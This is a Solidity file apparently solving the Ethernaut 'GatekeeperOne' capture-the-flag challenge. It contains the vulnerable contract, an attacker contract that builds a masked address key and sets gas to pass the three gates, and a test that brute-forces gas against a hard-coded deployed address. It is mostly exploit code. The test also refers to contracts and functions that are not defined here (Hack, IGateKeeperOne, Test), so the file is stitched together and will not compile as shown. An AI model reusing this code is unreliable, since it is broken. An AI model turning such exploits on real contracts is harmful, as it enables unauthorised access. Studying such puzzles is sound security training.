// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        // requires the remaining gas at that point in the contract's execution to be a multiple of 8191.
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttacker {
    GatekeeperOne target;
    address owner;

    constructor(address _target) {
        target = GatekeeperOne(_target);
        owner = msg.sender;
    }

    function attack(uint gasAmount) public {
        // Calculate the gate key based on owner's address
        // Ethereum addresses are 20 bytes (160 bits) long.
        // 0000 to ensure uint32(k) == uint16(k), k = uint64 number
        bytes8 gateKey = bytes8(uint64(uint160(owner)) & 0xFFFFFFFF0000FFFF);

        // Use the input gas amount to pass gate two
        // The gas amount is now provided as a parameter to the function
        target.enter{gas: gasAmount}(gateKey);
    }
}

contract TestGateKeeperOne is Test {
    IGateKeeperOne private target;
    // GatekeeperOne private target;
    Hack private hack;

    function setUp() public {
        target = IGateKeeperOne(0x037e210a2575f2f57207540c3a33AF1C03Eaef39);
        // target = new GatekeeperOne();
        hack = new Hack();
    }

    function test() public {
        for (uint256 i = 100; i < 8191; i++) {
            try hack.enter(address(target), i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("all failed");
    }
}
